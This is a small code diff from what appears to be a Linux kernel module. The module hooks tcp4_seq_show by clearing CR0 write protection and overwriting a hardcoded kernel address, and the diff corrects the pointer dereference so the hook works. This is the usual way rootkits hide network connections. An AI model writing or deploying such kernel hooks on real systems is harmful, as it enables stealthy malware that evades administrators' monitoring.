@@ -8,7 +8,7 @@
 // Types & other consts.
 typedef int (*original_tcp4_seq_show_t)(struct seq_file *seq, void *v);
 static original_tcp4_seq_show_t original_tcp4_seq_ptr;
-static unsigned long *tcp4_seq_show_address = (unsigned long *)0xffffffff82d2c290; 
+static unsigned long *tcp4_seq_show_address = (unsigned long *)0xffffffff87b2c290; 
  
 static inline void wp_cr0(unsigned long val) {
     __asm__ __volatile__ ("mov %0, %%cr0": "+r" (val));
@@ -33,7 +33,7 @@ int tcp4_seq_show(struct seq_file *seq, void *v) {
 int load(void) {
     printk(KERN_ALERT "Initializing...");
     zero_cr0();
-    original_tcp4_seq_ptr = (original_tcp4_seq_show_t)tcp4_seq_show_address;
+    original_tcp4_seq_ptr = (original_tcp4_seq_show_t)*tcp4_seq_show_address;
     *tcp4_seq_show_address = (long unsigned int)tcp4_seq_show;
     printk(KERN_ALERT "Overrided tcp4_seq_show!");
     one_cr0();
